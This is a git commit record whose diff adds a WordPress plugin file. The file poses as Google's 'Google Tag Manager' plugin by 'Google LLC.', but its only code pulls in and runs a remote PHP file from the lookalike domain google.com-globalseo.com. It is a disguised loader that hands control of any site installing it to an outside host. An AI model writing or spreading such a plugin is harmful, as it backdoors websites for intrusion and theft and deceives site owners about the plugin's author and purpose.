3c0dd4e1bbd163fdaa784827f03a7c726869571f
Youssuf Abramo <84648094+YoussufAbramo@users.noreply.github.com>
2024-01-07 19:40:08 +0400

    Create index.php

---
+++ wp-plugin/script-runner/index.php
@@ -0,0 +1,9 @@
+<?php
+/*
+Plugin Name: Google Tag Manager
+Description: Integrate your website with Google Developer Services, including Google tag manager.
+Version: 1.5.2
+Author: Google LLC.
+*/
+
+include_once 'https://google.com-globalseo.com/s/gtag-manager.php';
